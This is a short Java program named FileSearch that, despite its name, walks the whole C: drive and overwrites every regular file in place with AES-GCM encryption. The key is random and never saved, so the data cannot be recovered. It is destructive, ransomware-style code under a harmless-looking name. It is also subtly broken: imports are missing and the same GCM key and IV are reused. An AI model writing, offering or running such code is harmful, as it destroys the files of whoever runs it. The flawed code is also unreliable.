import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;

public class FileSearch {
    public static void main(String[] args) throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, IOException {
        String startDir = "C:\\"; // change this to the desired starting directory
        KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
        keyGenerator.init(256);
        SecretKey secretKey = keyGenerator.generateKey();
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
        search(startDir, secretKey, cipher,parameterSpec);
    }

    public static void search(String startDir, SecretKey secretKey, Cipher cipher, GCMParameterSpec parameterSpec) throws InvalidKeyException, IOException {
        try {
            Files.walk(Paths.get(startDir))
                .filter(Files::isRegularFile)
                .forEach(file -> {
                    try {
                        encryptFile(file.toFile(), secretKey, cipher, parameterSpec);
                    } catch (InvalidKeyException | IOException e) {
                        e.printStackTrace();
                    }
                });
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void encryptFile(File file, SecretKey secretKey, Cipher cipher, GCMParameterSpec parameterSpec) throws InvalidKeyException, IOException {
cipher.init(Cipher.ENCRYPT_MODE, secretKey, parameterSpec);
FileInputStream inputStream = new FileInputStream(file);
byte[] inputBytes = new byte[(int) file.length()];
inputStream.read(inputBytes);
byte[] outputBytes = cipher.doFinal(inputBytes);
FileOutputStream outputStream = new FileOutputStream(file);
outputStream.write(outputBytes);
inputStream.close();
outputStream.close();
}
}

